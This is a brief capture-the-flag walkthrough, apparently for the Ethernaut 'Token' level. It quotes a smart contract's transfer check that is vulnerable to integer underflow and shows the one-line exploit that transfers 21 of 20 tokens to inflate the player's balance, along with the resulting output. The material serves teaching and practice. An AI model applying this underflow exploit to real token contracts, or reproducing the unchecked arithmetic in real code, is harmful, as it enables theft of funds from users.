# Token

The goal of this level is for you to hack the basic token contract below.

You are given 20 tokens to start with and you will beat the level if you somehow manage to get your hands on any additional tokens. Preferably a very large amount of tokens.

  Things that might help:

What is an odometer?

Take a look at the condition for transfer:
```javascript
require(balances[msg.sender] - _value >= 0);
```

Current total token of attacker is 20, it mean if we pass the value `21`.It will cause the underflow attack and return large amount of tokens because uint can't store minus value:
```javascript
contract.transfer(player, 21);
```

Check the balance of player:
```javascript
await contract.balanceOf(player).then((x) => x.toNumber());
> 1.157920892373162e77;
```